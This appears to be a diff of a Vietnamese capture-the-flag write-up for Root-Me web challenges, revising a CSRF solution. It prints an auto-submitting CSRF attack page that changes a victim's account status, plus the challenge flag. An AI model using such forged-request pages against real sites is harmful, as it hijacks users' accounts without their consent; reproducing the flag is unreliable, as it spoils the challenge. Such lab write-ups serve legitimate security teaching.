@@ -1,6 +1,5 @@
 # Trần Mạnh Huy - JWT - json web token
 <hr>
-# Table of content 
 
 * [Chall 1: JSON Web Token (JWT) - Introduction](#chall-1-json-web-token-jwt---introduction)
 * [Chall 2: JSON Web Token (JWT) - Weak secret](#chall-2-json-web-token-jwt---weak-secret)
@@ -116,45 +115,52 @@ Ta có thể để ý status đang bị disabled, ta có thể sửa lại thàn
 Bây giờ ta cần gửi 1 form tương tự để lừa admin kick vào link ta gửi. Lấy luôn source code từ trang và thêm link trang vào phần action:
 
 ```
-<form id="profile" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data">
-			<div>
-			<label>Username:</label>
-			<input id="username" type="text" name="username" value="huy123456">
-			</div>
-			<br>		
-			<div>
-			<label>Status:</label>
-			<input id="status" type="checkbox" name="status" value="on" >
-			</div>
-			<br>
-			<input id="token" type="hidden" name="token" value="dd29a211ad5ad8b6e426dde5150648dd" />
-			<button type="submit">Submit</button>
-			</form>
-   <script>document.getElementById("profile").submit();</script>
-   
-   ```
- Sửa lại form 1 chút:
- 
- ```
-<html>
-<head>
-<script>
-function loadform(){document.getElementById("formcsrf").submit()}
-</script>
-</head>
-<body onload="loadform()">
-<form id="formcsrf" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data">
+<form id="csrf" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data">
+<div>
 <label>Username:</label>
 <input id="username" type="text" name="username" value="huy123456">
+</div>
 <br>		
+<div>
 <label>Status:</label>
-<input type="checkbox" name="status" value="on" checked>
+<input id="status" type="checkbox" name="status" value="on" >
+</div>
 <br>
+<input id="token" type="hidden" name="token" value="dd29a211ad5ad8b6e426dde5150648dd" />
+<button type="submit">Submit</button>
 </form>
+   
+   ```
+ Sửa lại form 1 chút, thêm script để tự động gửi submit: 
+ 
+ ```
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF</title>
+</head>
+<body>
+    <form id="csrf" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST" enctype="multipart/form-data">
+    <input type="hidden" name="username" value="huy123456" />
+    <input type="hidden" name="status" value="on" />
+    </form>
+<script> document.getElementById("csrf").submit()</script> 
 </body>
 </html>
 
 ```
 
+Đợi 1 lúc ta được flag trả về:
+
+> Csrf_Fr33style-L3v3l1!
+
+## Chall 5: CSRF - token bypass
+
+```
+Activate your account to access intranet.
+
+```
 
 
